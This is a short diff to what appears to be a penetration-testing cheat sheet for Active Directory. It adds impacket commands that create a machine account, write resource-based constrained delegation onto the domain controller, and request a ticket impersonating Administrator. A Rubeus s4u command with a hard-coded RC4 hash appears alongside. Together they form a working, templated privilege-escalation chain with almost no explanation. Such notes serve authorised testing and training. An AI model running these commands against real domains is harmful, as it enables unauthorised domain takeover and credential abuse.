@@ -27,6 +27,12 @@ $Descriptor.DiscretionaryAcl
 .\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/{{COMPUTER_NAME}} /ptt
 ```
 
+```bash
+impacket-addcomputer -computer-name 'testprivesc$' -computer-pass test -dc-ip {{DC_IP}} {{DOMAIN_NB}}/{{USERNAME}}:{{PASSWORD}}
+impacket-rbcd -action write -delegate-from 'testprivesc$' -delegate-to 'DC$' -dc-ip {{DC_IP}} '{{DOMAIN_NB}}/{{USERNAME}}:{{PASSWORD}}'
+impacket-getST -spn 'cifs/DC.{{DOMAIN}}' -impersonate Administrator -dc-ip {{DC_IP}} '{{DOMAIN}}/testprivesc$:test'
+```
+
 Copy last ticket at the bottom of output and save as ticket.kirbi.b64 
 
 ```bash
